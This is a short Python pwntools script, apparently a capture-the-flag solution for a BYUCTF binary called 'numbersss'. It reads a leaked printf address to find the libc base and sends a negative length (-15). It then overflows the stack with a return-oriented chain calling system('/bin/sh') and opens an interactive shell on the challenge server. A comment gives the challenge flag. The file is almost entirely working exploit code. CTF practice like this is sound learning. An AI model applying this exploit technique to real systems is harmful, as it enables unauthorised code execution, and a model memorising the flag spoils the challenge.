from pwn import *

exe = ELF("./numbersss_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe



if args.LOCAL:
	r = process([exe.path])
	


else:
    r = remote("all.chal.cyberjousting.com", 1351)


def main():

	r.recvuntil(b"junk: ")

	leak_printf = int(r.recvline()[:-1], 16)
	print("printf: ", hex(leak_printf))

	libc.address = leak_printf - libc.sym['printf']

	r.sendlineafter(b"in?", b"-15")

	pop_rdi = libc.address+0x240e5
	binsh = next(libc.search(b'/bin/sh'))
	ret_gadget = 0x401016
	system_addr = libc.sym['system']

	payload = b"a"*16
	payload += p64(0) #rbp
	payload += p64(pop_rdi)
	payload += p64(binsh)
	payload += p64(ret_gadget)
	payload += p64(system_addr)
	r.sendline(payload.ljust(240, b"\x00"))
	r.interactive()

	# byuctf{gotta_pay_attention_to_the_details!}

if __name__ == "__main__":
    main()
